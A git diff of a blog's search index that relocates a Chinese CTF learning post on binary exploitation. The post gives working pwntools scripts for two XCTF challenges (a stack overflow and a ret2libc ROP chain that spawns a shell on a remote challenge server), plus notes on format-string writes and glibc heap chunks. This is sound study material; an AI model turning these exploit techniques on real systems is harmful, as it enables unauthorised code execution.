@@ -279,6 +279,85 @@
       </tags>
   </entry>
   <entry>
+    <title>pwn:从一窍不通到入门的门前</title>
+    <url>/2022/07/06/pwn-%E4%BB%8E%E4%B8%80%E7%AA%8D%E4%B8%8D%E9%80%9A%E5%88%B0%E5%85%A5%E9%97%A8%E7%9A%84%E9%97%A8%E5%89%8D/</url>
+    <content><![CDATA[<p>基础pwn例题，栈溢出，格式化字符串。</p>
+<span id="more"></span>
+<h3 id="栈溢出例题">栈溢出例题</h3>
+<h4 id="hello-pwn">hello_pwn</h4>
+<p>来源：攻防世界</p>
+<p>首先先checksec：</p>
+<p><img src="https://i.niupic.com/images/2022/09/04/a51X.png" alt=""></p>
+<p>再看伪代码：</p>
+<p><img src="https://i.niupic.com/images/2022/09/04/a51Y.png" alt=""></p>
+<p>再看偏移量：</p>
+<p><img src="https://i.niupic.com/images/2022/09/04/a51Z.png" alt=""></p>
+<p>这里基本就明白了：当dowrd_60106C=1853186401时，执行下面的sub函数，sub函数就直接得出flag了，因此只要再前一步的read函数那里创造栈溢出，再人为满足条件判断即可。</p>
+<p>exp:</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=process(<span class="string">&#x27;./hello_pwn&#x27;</span>)</span><br><span class="line"><span class="comment">#p=remote(&#x27;111.200.241.244&#x27;,52016)</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span>+p64(<span class="number">1853186401</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h4 id="level3">level3</h4>
+<p>来源：攻防世界</p>
+<p>checksec:</p>
+<p><img src="https://i.niupic.com/images/2022/09/04/a520.png" alt=""></p>
+<p>32位程序，开启堆栈不可执行，这是一道构造ROP的经典例题。</p>
+<p><img src="https://i.niupic.com/images/2022/09/04/a521.png" alt=""></p>
+<p>源码看出漏洞还是栈溢出，但是此时找不到现成的system函数和binsh字符串。</p>
+<p>因此要找到system函数，知识点(搬运自wiki)</p>
+<ul>
+<li>system 函数属于 libc，而 <a href="http://libc.so">libc.so</a> 动态链接库中的函数之间相对偏移是固定的。</li>
+<li>即使程序有 ASLR 保护，也只是针对于地址中间位进行随机，最低的 12 位并不会发生改变。</li>
+<li>查找Libc的网址：<a href="https://libc.blukat.me/">https://libc.blukat.me/</a>和<a href="https://libc.rip/">https://libc.rip/</a></li>
+</ul>
+<p>简单来说：实际的(真实的)地址是需要计算出来的，具体计算方式是：<strong>实际地址=libc偏移量+libc基地址</strong>在已知libc的情况下，我们需要做的就是找到<strong>libc的基址</strong>，而想要找到基址，我们需要知道一个函数的实际地址，本题中关键函数内存在write,read函数，因此想法是使用write函数泄露出write函数的真实地址，而plt表，got表，实际加载地址可以参考下图(搬运自csdn(滑稽))：</p>
+<p><img src="https://i.niupic.com/images/2022/09/04/a522.png" alt=""></p>
+<p>这样就可以得到基本的思路了: 先构造栈溢出使程序跳到write函数的plt表地址上，此时再次调用main函数或者vulnerable函数再次执行，此时就可以利用write函数打印出write的got表地址，此时需要我们人为的输入write函数的参数。这样就可以得到write函数的真实地址了。栈上的流程大概是这样的（仍然是搬运的(滑天下之大稽）：</p>
+<p><img src="https://i.niupic.com/images/2022/09/04/a523.png" alt=""></p>
+<p>这样输出之后我们就得到了write函数的真实地址了，再通过libc来求得system和binsh的真实地址，最后第二次调动程序，再次利用漏洞，就可以得到shell。</p>
+<p>exp：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p=process(&#x27;./level3&#x27;)</span></span><br><span class="line">p=remote(<span class="string">&#x27;61.147.171.105&#x27;</span>,<span class="number">59245</span>)</span><br><span class="line"></span><br><span class="line">padding=<span class="number">0x88</span></span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">&#x27;./level3&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc_32.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">write_plt=elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got=elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">main_addr=elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;:\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x88</span>+<span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span>+p32(write_plt)+p32(main_addr)+p32(<span class="number">1</span>)+p32(write_got)+p32(<span class="number">0xdeadbeef</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">write_got_addr=u32(p.recv()[:<span class="number">4</span>])</span><br><span class="line"><span class="built_in">print</span>(write_got_addr)</span><br><span class="line"></span><br><span class="line">libc_write=libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">libc_base=write_got_addr-libc_write</span><br><span class="line"></span><br><span class="line">system_addr=libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;the system address is:&#x27;</span>,<span class="built_in">hex</span>(system_addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libc_bin=<span class="built_in">next</span>(libc.search(<span class="string">b&quot;bin/sh&quot;</span>))//找到binsh偏移的方法</span><br><span class="line">bin_addr=libc_base+libc_bin</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;the binsh address is:&quot;</span>,<span class="built_in">hex</span>(bin_addr))</span><br><span class="line"></span><br><span class="line">payload2=<span class="string">b&#x27;a&#x27;</span>*padding+<span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span>+p32(system_addr)+p32(<span class="number">0xdeadbeef</span>)+p32(bin_addr)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;:\n&#x27;</span>)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h3 id="格式化字符串">格式化字符串</h3>
+<p>基本原理以及利用方法在wiki上有解释。</p>
+<p>&lt;<a href="https://ctf-wiki.org/pwn/linux/user-mode/fmtstr/fmtstr-intro/">原理介绍 - CTF Wiki (ctf-wiki.org)</a>&gt;</p>
+<p>主要意思是利用printf一类函数漏洞，当函数没有严格规定格式化字符串时，攻击者可以控制printf函数来输出其他内容，由于格式化字符串输出的是栈上内容，因此此漏洞可以找到栈上其他位置的信息，比如地址，数据。总结一下就是：超出的每一个格式化字符串都能对下一格栈空间造成影响。</p>
+<p>%d:打印成数字，只能泄露栈本身内容</p>
+<p>%x:打印成16进制，只能泄露栈本身内容</p>
+<p>%s:识别栈上内容为指针，打印出该指针指向的位置，这里有可能造成任意地址的泄露（只要能控制栈并完成布局）</p>
+<p>%c:输出字符</p>
+<p>%n:把前面已经打印的长度<strong>写入</strong>某个内存地址(实现任意地址写入)</p>
+<p>%n:写入4个字节，写入1–&gt;0000 0001</p>
+<p>%hn:写入两个字节，写入1–&gt;0001</p>
+<p>%hhn:写入单个字节,写入1–&gt;01</p>
+<h3 id="整数溢出">整数溢出</h3>
+<p>啥都没有，因为懒得搞，搞堆去了</p>
+<p><img src="https://i.niupic.com/images/2022/09/04/a51S.jpg" alt=""></p>
+<h3 id="堆学习">堆学习</h3>
+<p>这里主要是学习了ptmalloc2 – glibc的堆实现和堆利用。</p>
+<h4 id="堆的相关数据结构">堆的相关数据结构</h4>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  This struct declaration is misleading (but accurate and necessary).</span></span><br><span class="line"><span class="comment">  It declares a &quot;view&quot; into memory allowing access to necessary</span></span><br><span class="line"><span class="comment">  fields at known offsets from a given base. See explanation below.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">malloc_chunk</span> &#123;</span><br><span class="line"></span><br><span class="line">  INTERNAL_SIZE_T      prev_size;  <span class="comment">/* Size of previous chunk (if free).  */</span></span><br><span class="line">  INTERNAL_SIZE_T      size;       <span class="comment">/* Size in bytes, including overhead. */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">malloc_chunk</span>* fd;         <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">malloc_chunk</span>* bk;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Only used for large blocks: pointer to next larger size.  */</span></span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">malloc_chunk</span>* fd_nextsize; <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">malloc_chunk</span>* bk_nextsize;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+<p>可以看出在一个chunk中有这样几个数据</p>
+<ul>
+<li>prev_size: 如果该 chunk 的**物理相邻的前一地址 chunk（两个指针的地址差值为前一 chunk 大小）**是空闲的话，那该字段记录的是前一个 chunk 的大小 (包括 chunk 头)。否则，该字段可以用来存储物理相邻的前一个 chunk 的数据。<strong>这里的前一 chunk 指的是较低地址的 chunk</strong> 。也就是说，上一个chunk空闲，表示大小，调用，则表示值。</li>
+<li>size：该chunk的大小，大小必须是 2 * SIZE_SZ 的整数倍。如果申请的内存大小不是 2 * SIZE_SZ 的整数倍，会被转换满足大小的最小的 2 * SIZE_SZ 的倍数。32 位系统中，SIZE_SZ 是 4；64 位系统中，SIZE_SZ 是 8。 也就是说64位size是16的整数倍，32位size是8的整数倍，这里就说明无论是32还是64位，size的低三位都一定是0，这样的话在chunk中这三位可以表示其他信息，分别从高到低表示为A，M，P。A表示该chunk是否属于主线程，1表示不属于，0表示属于；M表示记录当前chunk是否由mmap分配；P表示记录<strong>前一个 chunk</strong> 块是否被分配。一般来说，堆中<strong>第一个被分配的内存块的 size 字段的 P 位都会被设置为 1</strong>，以便于防止访问前面的非法内存。**当一个 chunk 的 size 的 P 位为 0 时，我们能通过 prev_size 字段来获取上一个 chunk 的大小以及地址。***这也方便进行空闲 chunk 之间的合并。</li>
+<li>fd和bk：fd表示指向下一个空闲的chunk，bk表示指向上一个空闲的chunk，这里要注意的是上下表示的是空闲的顺序而不是地址上的相邻。通过这里两个指针可以让空闲的chunk块加入到chunk块列表统一管理</li>
+<li>fd_nextsize,bk_nextsize：只用chunk空闲才使用，但用于较大的chunk，fd_nextsize指向前一个与当前chunk大小不同的第一个空闲块，不含bin指针；bk_nextsize指向后一个与当前chunk大小不同的第一个空闲块，不含bin指针。</li>
+</ul>
+<p>前两个字段称为chunk header,后面的部分称为user data。每次malloc申请得到的内存指针，是指向user data的起始处。</p>
+<p>当一个 chunk 处于使用状态时，它的下一个 chunk 的 prev_size 域无效，所以下一个 chunk 的该部分也可以被当前 chunk 使用。<strong>这就是 chunk 中的空间复用。</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             Size of previous chunk, if unallocated (P clear)  |</span><br><span class="line">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             Size of chunk, in bytes                     |A|M|P|</span><br><span class="line">  mem-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             User data starts here...                          .</span><br><span class="line">        .                                                               .</span><br><span class="line">        .             (malloc_usable_size() bytes)                      .</span><br><span class="line">next    .                                                               |</span><br><span class="line">chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             (size of chunk, but used for application data)    |</span><br><span class="line">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             Size of next chunk, in bytes                |A|0|1|</span><br><span class="line">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br></pre></td></tr></table></figure>
+<p>被释放的chunk被记录在链表中，具体结构如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             Size of previous chunk, if unallocated (P clear)  |</span><br><span class="line">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">`head:&#x27; |             Size of chunk, in bytes                     |A|0|P|</span><br><span class="line">  mem-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             Forward pointer to next chunk in list             |</span><br><span class="line">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             Back pointer to previous chunk in list            |</span><br><span class="line">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             Unused space (may be 0 bytes long)                .</span><br><span class="line">        .                                                               .</span><br><span class="line"> next   .                                                               |</span><br><span class="line">chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">`foot:&#x27; |             Size of chunk, in bytes                           |</span><br><span class="line">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             Size of next chunk, in bytes                |A|0|0|</span><br><span class="line">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br></pre></td></tr></table></figure>
+<h4 id="bin是什么">bin是什么</h4>
+<p>首先，用户释放的chunk不会马上归还给系统，ptmalloc会统一管理heap和mmap映射区域中空闲的chunk，用户再次请求分配内存时，ptmalloc会试图在空闲的chunk中挑选一块合适的给用户，可避免频繁地系统调用。ptmalloc会将空闲chunk的大小以及使用状态将chunk分为4类，fast bins, small bins, large bins, unsorted bin。相似大小的chunk会用双向链表链接起来，也就是说每类bin的内部会有多个互不相关的链表来保存不同大小的chunk。</p>
+]]></content>
+      <categories>
+        <category>CTF!</category>
+      </categories>
+      <tags>
+        <tag>基础</tag>
+        <tag>pwn</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>“代码规范”</title>
     <url>/2022/08/02/%E4%BB%A3%E7%A0%81%E8%A7%84%E8%8C%83/</url>
     <content><![CDATA[<p>软件开发代码规范:</p>
@@ -382,82 +461,89 @@
       </tags>
   </entry>
   <entry>
-    <title>pwn:从一窍不通到入门的门前</title>
-    <url>/2022/07/06/pwn-%E4%BB%8E%E4%B8%80%E7%AA%8D%E4%B8%8D%E9%80%9A%E5%88%B0%E5%85%A5%E9%97%A8%E7%9A%84%E9%97%A8%E5%89%8D/</url>
-    <content><![CDATA[<p>基础pwn例题，栈溢出，格式化字符串。</p>
+    <title>函数调用栈</title>
+    <url>/2022/10/14/%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E6%A0%88/</url>
+    <content><![CDATA[<p>c语言调用函数时栈的情况</p>
 <span id="more"></span>
-<h3 id="栈溢出例题">栈溢出例题</h3>
-<h4 id="hello-pwn">hello_pwn</h4>
-<p>来源：攻防世界</p>
-<p>首先先checksec：</p>
-<p><img src="https://i.niupic.com/images/2022/09/04/a51X.png" alt=""></p>
-<p>再看伪代码：</p>
-<p><img src="https://i.niupic.com/images/2022/09/04/a51Y.png" alt=""></p>
-<p>再看偏移量：</p>
-<p><img src="https://i.niupic.com/images/2022/09/04/a51Z.png" alt=""></p>
-<p>这里基本就明白了：当dowrd_60106C=1853186401时，执行下面的sub函数，sub函数就直接得出flag了，因此只要再前一步的read函数那里创造栈溢出，再人为满足条件判断即可。</p>
-<p>exp:</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=process(<span class="string">&#x27;./hello_pwn&#x27;</span>)</span><br><span class="line"><span class="comment">#p=remote(&#x27;111.200.241.244&#x27;,52016)</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span>+p64(<span class="number">1853186401</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<h4 id="level3">level3</h4>
-<p>来源：攻防世界</p>
-<p>checksec:</p>
-<p><img src="https://i.niupic.com/images/2022/09/04/a520.png" alt=""></p>
-<p>32位程序，开启堆栈不可执行，这是一道构造ROP的经典例题。</p>
-<p><img src="https://i.niupic.com/images/2022/09/04/a521.png" alt=""></p>
-<p>源码看出漏洞还是栈溢出，但是此时找不到现成的system函数和binsh字符串。</p>
-<p>因此要找到system函数，知识点(搬运自wiki)</p>
-<ul>
-<li>system 函数属于 libc，而 <a href="http://libc.so">libc.so</a> 动态链接库中的函数之间相对偏移是固定的。</li>
-<li>即使程序有 ASLR 保护，也只是针对于地址中间位进行随机，最低的 12 位并不会发生改变。</li>
-<li>查找Libc的网址：<a href="https://libc.blukat.me/">https://libc.blukat.me/</a>和<a href="https://libc.rip/">https://libc.rip/</a></li>
-</ul>
-<p>简单来说：实际的(真实的)地址是需要计算出来的，具体计算方式是：<strong>实际地址=libc偏移量+libc基地址</strong>在已知libc的情况下，我们需要做的就是找到<strong>libc的基址</strong>，而想要找到基址，我们需要知道一个函数的实际地址，本题中关键函数内存在write,read函数，因此想法是使用write函数泄露出write函数的真实地址，而plt表，got表，实际加载地址可以参考下图(搬运自csdn(滑稽))：</p>
-<p><img src="https://i.niupic.com/images/2022/09/04/a522.png" alt=""></p>
-<p>这样就可以得到基本的思路了: 先构造栈溢出使程序跳到write函数的plt表地址上，此时再次调用main函数或者vulnerable函数再次执行，此时就可以利用write函数打印出write的got表地址，此时需要我们人为的输入write函数的参数。这样就可以得到write函数的真实地址了。栈上的流程大概是这样的（仍然是搬运的(滑天下之大稽）：</p>
-<p><img src="https://i.niupic.com/images/2022/09/04/a523.png" alt=""></p>
-<p>这样输出之后我们就得到了write函数的真实地址了，再通过libc来求得system和binsh的真实地址，最后第二次调动程序，再次利用漏洞，就可以得到shell。</p>
-<p>exp：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p=process(&#x27;./level3&#x27;)</span></span><br><span class="line">p=remote(<span class="string">&#x27;61.147.171.105&#x27;</span>,<span class="number">59245</span>)</span><br><span class="line"></span><br><span class="line">padding=<span class="number">0x88</span></span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">&#x27;./level3&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc_32.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">write_plt=elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got=elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">main_addr=elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;:\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x88</span>+<span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span>+p32(write_plt)+p32(main_addr)+p32(<span class="number">1</span>)+p32(write_got)+p32(<span class="number">0xdeadbeef</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">write_got_addr=u32(p.recv()[:<span class="number">4</span>])</span><br><span class="line"><span class="built_in">print</span>(write_got_addr)</span><br><span class="line"></span><br><span class="line">libc_write=libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">libc_base=write_got_addr-libc_write</span><br><span class="line"></span><br><span class="line">system_addr=libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;the system address is:&#x27;</span>,<span class="built_in">hex</span>(system_addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libc_bin=<span class="built_in">next</span>(libc.search(<span class="string">b&quot;bin/sh&quot;</span>))//找到binsh偏移的方法</span><br><span class="line">bin_addr=libc_base+libc_bin</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;the binsh address is:&quot;</span>,<span class="built_in">hex</span>(bin_addr))</span><br><span class="line"></span><br><span class="line">payload2=<span class="string">b&#x27;a&#x27;</span>*padding+<span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span>+p32(system_addr)+p32(<span class="number">0xdeadbeef</span>)+p32(bin_addr)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;:\n&#x27;</span>)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<h3 id="格式化字符串">格式化字符串</h3>
-<p>基本原理以及利用方法在wiki上有解释。</p>
-<p>&lt;<a href="https://ctf-wiki.org/pwn/linux/user-mode/fmtstr/fmtstr-intro/">原理介绍 - CTF Wiki (ctf-wiki.org)</a>&gt;</p>
-<p>主要意思是利用printf一类函数漏洞，当函数没有严格规定格式化字符串时，攻击者可以控制printf函数来输出其他内容，由于格式化字符串输出的是栈上内容，因此此漏洞可以找到栈上其他位置的信息，比如地址，数据。总结一下就是：超出的每一个格式化字符串都能对下一格栈空间造成影响。</p>
-<p>%d:打印成数字，只能泄露栈本身内容</p>
-<p>%x:打印成16进制，只能泄露栈本身内容</p>
-<p>%s:识别栈上内容为指针，打印出该指针指向的位置，这里有可能造成任意地址的泄露（只要能控制栈并完成布局）</p>
-<p>%c:输出字符</p>
-<p>%n:把前面已经打印的长度<strong>写入</strong>某个内存地址(实现任意地址写入)</p>
-<p>%n:写入4个字节，写入1–&gt;0000 0001</p>
-<p>%hn:写入两个字节，写入1–&gt;0001</p>
-<p>%hhn:写入单个字节,写入1–&gt;01</p>
-<h3 id="整数溢出">整数溢出</h3>
-<p>啥都没有，因为懒得搞，搞堆去了</p>
-<p><img src="https://i.niupic.com/images/2022/09/04/a51S.jpg" alt=""></p>
-<h3 id="堆学习">堆学习</h3>
-<p>这里主要是学习了ptmalloc2 – glibc的堆实现和堆利用。</p>
-<h4 id="堆的相关数据结构">堆的相关数据结构</h4>
-<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  This struct declaration is misleading (but accurate and necessary).</span></span><br><span class="line"><span class="comment">  It declares a &quot;view&quot; into memory allowing access to necessary</span></span><br><span class="line"><span class="comment">  fields at known offsets from a given base. See explanation below.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">malloc_chunk</span> &#123;</span><br><span class="line"></span><br><span class="line">  INTERNAL_SIZE_T      prev_size;  <span class="comment">/* Size of previous chunk (if free).  */</span></span><br><span class="line">  INTERNAL_SIZE_T      size;       <span class="comment">/* Size in bytes, including overhead. */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">malloc_chunk</span>* fd;         <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">malloc_chunk</span>* bk;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Only used for large blocks: pointer to next larger size.  */</span></span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">malloc_chunk</span>* fd_nextsize; <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">malloc_chunk</span>* bk_nextsize;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
-<p>可以看出在一个chunk中有这样几个数据</p>
-<ul>
-<li>prev_size: 如果该 chunk 的**物理相邻的前一地址 chunk（两个指针的地址差值为前一 chunk 大小）**是空闲的话，那该字段记录的是前一个 chunk 的大小 (包括 chunk 头)。否则，该字段可以用来存储物理相邻的前一个 chunk 的数据。<strong>这里的前一 chunk 指的是较低地址的 chunk</strong> 。也就是说，上一个chunk空闲，表示大小，调用，则表示值。</li>
-<li>size：该chunk的大小，大小必须是 2 * SIZE_SZ 的整数倍。如果申请的内存大小不是 2 * SIZE_SZ 的整数倍，会被转换满足大小的最小的 2 * SIZE_SZ 的倍数。32 位系统中，SIZE_SZ 是 4；64 位系统中，SIZE_SZ 是 8。 也就是说64位size是16的整数倍，32位size是8的整数倍，这里就说明无论是32还是64位，size的低三位都一定是0，这样的话在chunk中这三位可以表示其他信息，分别从高到低表示为A，M，P。A表示该chunk是否属于主线程，1表示不属于，0表示属于；M表示记录当前chunk是否由mmap分配；P表示记录<strong>前一个 chunk</strong> 块是否被分配。一般来说，堆中<strong>第一个被分配的内存块的 size 字段的 P 位都会被设置为 1</strong>，以便于防止访问前面的非法内存。**当一个 chunk 的 size 的 P 位为 0 时，我们能通过 prev_size 字段来获取上一个 chunk 的大小以及地址。***这也方便进行空闲 chunk 之间的合并。</li>
-<li>fd和bk：fd表示指向下一个空闲的chunk，bk表示指向上一个空闲的chunk，这里要注意的是上下表示的是空闲的顺序而不是地址上的相邻。通过这里两个指针可以让空闲的chunk块加入到chunk块列表统一管理</li>
-<li>fd_nextsize,bk_nextsize：只用chunk空闲才使用，但用于较大的chunk，fd_nextsize指向前一个与当前chunk大小不同的第一个空闲块，不含bin指针；bk_nextsize指向后一个与当前chunk大小不同的第一个空闲块，不含bin指针。</li>
-</ul>
-<p>前两个字段称为chunk header,后面的部分称为user data。每次malloc申请得到的内存指针，是指向user data的起始处。</p>
-<p>当一个 chunk 处于使用状态时，它的下一个 chunk 的 prev_size 域无效，所以下一个 chunk 的该部分也可以被当前 chunk 使用。<strong>这就是 chunk 中的空间复用。</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             Size of previous chunk, if unallocated (P clear)  |</span><br><span class="line">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             Size of chunk, in bytes                     |A|M|P|</span><br><span class="line">  mem-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             User data starts here...                          .</span><br><span class="line">        .                                                               .</span><br><span class="line">        .             (malloc_usable_size() bytes)                      .</span><br><span class="line">next    .                                                               |</span><br><span class="line">chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             (size of chunk, but used for application data)    |</span><br><span class="line">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             Size of next chunk, in bytes                |A|0|1|</span><br><span class="line">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br></pre></td></tr></table></figure>
-<p>被释放的chunk被记录在链表中，具体结构如下：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             Size of previous chunk, if unallocated (P clear)  |</span><br><span class="line">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">`head:&#x27; |             Size of chunk, in bytes                     |A|0|P|</span><br><span class="line">  mem-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             Forward pointer to next chunk in list             |</span><br><span class="line">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             Back pointer to previous chunk in list            |</span><br><span class="line">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             Unused space (may be 0 bytes long)                .</span><br><span class="line">        .                                                               .</span><br><span class="line"> next   .                                                               |</span><br><span class="line">chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">`foot:&#x27; |             Size of chunk, in bytes                           |</span><br><span class="line">        